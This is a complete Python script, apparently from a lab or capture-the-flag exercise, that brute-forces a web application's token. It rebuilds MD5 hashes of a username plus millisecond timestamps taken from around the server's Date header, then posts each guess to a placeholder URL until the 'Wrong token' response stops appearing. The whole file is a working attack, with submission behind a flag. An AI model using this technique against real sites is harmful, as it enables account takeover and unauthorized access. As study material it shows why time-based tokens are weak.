from hashlib import md5
from email.utils import parsedate_to_datetime
import requests
from sys import exit

# Get from the server response Date header (RFC1123)
epoch = int(parsedate_to_datetime("Sun, 12 Mar 2023 22:25:08 GMT").timestamp())
epoch_milliseconds = epoch * 1000
username = "changeme"  # Username for token generation

enable_sending_payload = False  # Enable sending request to the target url
# Change request params according to your needs
target_url = "http://IP:PORT/question1/"
host_header = "IP:PORT"
content_type_header = "application/x-www-form-urlencoded"
request_fail_text = "Wrong token"

for e in range(epoch_milliseconds - 1200, epoch_milliseconds + 1201):
    md5_input = username + str(e)
    md5_token = md5(md5_input.encode()).hexdigest()
    print("Generated token for {}: {}".format(md5_input, md5_token))

    if not enable_sending_payload:
        continue

    print("Sending request with payload {} - {} to {}".format(md5_input,
          md5_token, target_url))

    data = {
        "token": md5_token,
        "submit": "check"
    }

    headers = {
        "Host": host_header,
        "Content-Type": content_type_header
    }

    res = requests.post(target_url, data=data, headers=headers)

    if not request_fail_text in res.text:
        print(res.text)
        print("Success! raw reply printed before")
        exit()
